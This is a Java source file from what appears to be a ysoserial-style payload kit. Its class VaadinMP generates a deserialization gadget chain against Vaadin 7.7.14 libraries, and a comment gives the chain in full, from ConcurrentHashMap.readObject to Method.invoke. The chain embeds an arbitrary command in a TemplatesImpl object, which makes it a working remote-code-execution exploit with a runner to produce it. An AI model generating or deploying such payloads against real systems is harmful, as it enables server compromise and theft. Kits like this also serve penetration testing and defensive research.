package jdk.payloadGroups;

import com.vaadin.data.util.MethodProperty;
import com.vaadin.data.util.PropertysetItem;

import gadgetFragment.InvokeChainedFragment;
import gadgetFragment.ToStringFragment;
import jdk.payloadGroups.annotation.Authors;
import jdk.payloadGroups.annotation.Dependencies;
import jdk.payloadGroups.annotation.PayloadTest;
import jdk.PayloadRunner;
import util.Reflections;

/**
 * java.util.concurrent.ConcurrentHashMap.readObject
 * java.util.AbstractMap$SimpleEntry.equals
 * java.util.AbstractMap.access$000
 * java.util.AbstractMap.eq
 * java.util.concurrent.ConcurrentHashMap.equals
 * javax.swing.UIDefaults$TextAndMnemonicHashMap.get
 * com.vaadin.data.util.AbstractProperty.toString
 * com.vaadin.data.util.LegacyPropertyHelper.legacyPropertyToString
 * com.vaadin.data.util.MethodProperty.getValue
 * Method.invoke
 */
@Dependencies ( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class VaadinMP implements ObjectPayload<Object>
{
    @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = InvokeChainedFragment.createTemplatesImpl (command);

        MethodProperty<Object> nmprop = new MethodProperty<> (templ, "outputProperties");
        Object evilObject = ToStringFragment.getUdTAMToStringTrigger(nmprop, 4);
        Reflections.setFieldValue(templ,"_auxClasses", null);

        return evilObject;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(VaadinMP.class, args);
    }

}
